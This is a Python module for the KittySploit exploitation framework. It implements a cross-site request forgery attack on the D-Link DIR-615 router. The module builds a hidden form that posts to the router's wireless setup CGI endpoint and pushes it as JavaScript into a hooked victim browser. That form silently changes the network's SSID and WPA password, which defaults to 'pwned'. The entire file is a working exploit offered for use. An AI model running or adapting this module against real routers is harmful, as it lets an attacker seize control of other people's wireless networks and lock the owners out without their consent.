from kittysploit import *
from lib.protocols.http.csrf import Csrf

class Module(BrowserAuxiliary, Csrf):
	
	__info__ = {
		"name": "D-Link DIR-615 CSRF",
		"description": "D-Link DIR-615 router - Change wireless password via CSRF POST",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}
	
	target = OptString("http://192.168.1.1", "Target router URL (with http://)", required=True)
	ssid = OptString("Dravidian", "SSID name", required=True)
	password = OptString("pwned", "New wireless password", required=True)

	def run(self):
		form_data = [
			f'<form method="POST" action="{self.target}/form2WlanBasicSetup.cgi">',
			f'<input type="hidden" name="domain" value="1" />',
			f'<input type="hidden" name="hiddenSSID" value="on" />',
			f'<input type="hidden" name="ssid" value="{self.ssid}" />',
			f'<input type="hidden" name="band" value="10" />',
			f'<input type="hidden" name="chan" value="0" />',
			f'<input type="hidden" name="chanwid" value="1" />',
			f'<input type="hidden" name="txRate" value="0" />',
			f'<input type="hidden" name="method&#95;cur" value="6" />',
			f'<input type="hidden" name="method" value="0" />',
			f'<input type="hidden" name="authType" value="1" />',
			f'<input type="hidden" name="length" value="1" />',
			f'<input type="hidden" name="format" value="2" />',
			f'<input type="hidden" name="defaultTxKeyId" value="1" />',
			f'<input type="hidden" name="key1" value="0000000000" />',
			f'<input type="hidden" name="pskFormat" value="0" />',
			f'<input type="hidden" name="pskValue" value="{self.password}" />',
			f'<input type="hidden" name="checkWPS2" value="1" />',
			f'<input type="hidden" name="save" value="Apply" />',
			f'<input type="hidden" name="basicrates" value="15" />',
			f'<input type="hidden" name="operrates" value="4095" />',
			f'<input type="hidden" name="submit&#46;htm&#63;wlan&#95;basic&#46;htm" value="Send" />',
			f'<input type="submit" value="Submit request" />',
			'</form>'
		]
		
		print_info(f"Executing CSRF POST attack on: {self.target}")
		print_info(f"Target: {self.target}/form2WlanBasicSetup.cgi")
		print_info(f"SSID: {self.ssid}")
		print_info(f"New wireless password: {self.password}")
		
		js_code = self.csrf_post_and_submit(form_data)
		result = self.send_js_and_wait_for_response(js_code, timeout=10.0)
		
		if result:
			print_success("CSRF POST attack executed successfully")
			print_info(f"Response: {result}")
			print_info(f"Wireless password change request sent")
			return True
		else:
			fail.CSRFPostFailed()
		return False
